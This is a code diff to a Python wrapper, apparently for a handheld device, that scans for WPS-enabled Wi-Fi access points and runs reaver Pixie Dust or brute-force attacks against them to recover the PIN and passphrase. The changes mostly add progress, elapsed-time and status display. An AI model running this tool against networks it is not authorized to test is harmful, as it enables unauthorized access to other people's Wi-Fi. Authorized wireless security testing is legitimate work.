@@ -158,6 +158,9 @@ running = True
 progress_msg = ""
 found_pin = ""
 found_psk = ""
+last_reaver_line = ""
+attack_elapsed = 0
+attack_start_time = 0
 
 _iface = None
 _mon_iface = None
@@ -251,7 +254,8 @@ def _do_scan():
         return
 
     with lock:
-        status_msg = "Scanning WPS APs..."
+        status_msg = "Scanning for WPS APs..."
+        progress_msg = "Please wait ~10s..."
         view_mode = "scan"
 
     found = _scan_wps_aps(iface)
@@ -261,6 +265,8 @@ def _do_scan():
         scroll_pos = 0
         selected_idx = 0 if found else -1
         status_msg = f"Found {len(found)} WPS APs"
+        if not found:
+            progress_msg = "No WPS APs in range"
 
 
 # ---------------------------------------------------------------------------
@@ -271,18 +277,25 @@ def _run_reaver(ap, mode):
     """Run reaver against target AP."""
     global attack_running, progress_msg, found_pin, found_psk
     global _reaver_proc, status_msg, view_mode
+    global last_reaver_line, attack_elapsed, attack_start_time
 
     mon = _mon_iface or _iface
     bssid = ap["bssid"]
     channel = str(ap["channel"])
+    ssid_short = ap["ssid"][:12]
+
+    mode_label = "Trying Pixie Dust..." if mode == "pixie" else "Brute forcing..."
 
     with lock:
         attack_running = True
         found_pin = ""
         found_psk = ""
-        progress_msg = f"{mode.title()} attacking..."
+        last_reaver_line = ""
+        attack_start_time = time.time()
+        attack_elapsed = 0
+        progress_msg = mode_label
         view_mode = "attack"
-        status_msg = f"Attacking {ap['ssid'][:12]}..."
+        status_msg = f"Attacking {ssid_short}..."
 
     cmd = ["sudo", "reaver", "-i", mon, "-b", bssid, "-c", channel, "-vv"]
     if mode == "pixie":
@@ -309,6 +322,13 @@ def _run_reaver(ap, mode):
                 break
 
             line = line.strip()
+            if not line:
+                continue
+
+            # Update elapsed time
+            with lock:
+                attack_elapsed = int(time.time() - attack_start_time)
+                last_reaver_line = line[:22]
 
             # Check for PIN
             pin_match = pin_pattern.search(line)
@@ -335,6 +355,18 @@ def _run_reaver(ap, mode):
                 with lock:
                     progress_msg = f"{mode.title()}: {line[:20]}"
 
+            # Show association / key negotiation steps
+            low = line.lower()
+            if "associated" in low:
+                with lock:
+                    progress_msg = "Associated with AP"
+            elif "waiting for beacon" in low:
+                with lock:
+                    progress_msg = "Waiting for beacon..."
+            elif "sending eapol" in low or "sending wsc" in low:
+                with lock:
+                    progress_msg = "Sending WPS request..."
+
     except Exception:
         pass
     finally:
@@ -344,12 +376,13 @@ def _run_reaver(ap, mode):
 
     with lock:
         attack_running = False
+        attack_elapsed = int(time.time() - attack_start_time)
         if found_pin or found_psk:
             status_msg = "Attack succeeded!"
             view_mode = "result"
             _save_result(ap)
         else:
-            status_msg = f"{mode.title()} attack failed"
+            status_msg = f"{mode.title()} failed ({attack_elapsed}s)"
             progress_msg = "No PIN/PSK found"
 
 
@@ -395,6 +428,8 @@ def _draw_screen():
         pin = found_pin
         psk = found_psk
         atk = attack_running
+        rline = last_reaver_line
+        elapsed = attack_elapsed
 
     draw.text((2, 14), st[:22], fill="WHITE", font=font)
 
@@ -423,7 +458,11 @@ def _draw_screen():
         if psk:
             draw.text((2, 78), f"PSK: {psk[:16]}", fill="GREEN", font=font)
 
+        # Show reaver output line and elapsed time
         if atk:
+            mins, secs = divmod(elapsed, 60)
+            draw.text((2, 92), rline[:22], fill="#888", font=font)
+            draw.text((2, 104), f"Elapsed: {mins}m{secs:02d}s", fill="#666", font=font)
             draw.text((2, 116), "Attacking... K3=exit", fill="RED", font=font)
         else:
             draw.text((2, 116), "K2=mode OK=retry", fill="GRAY", font=font)
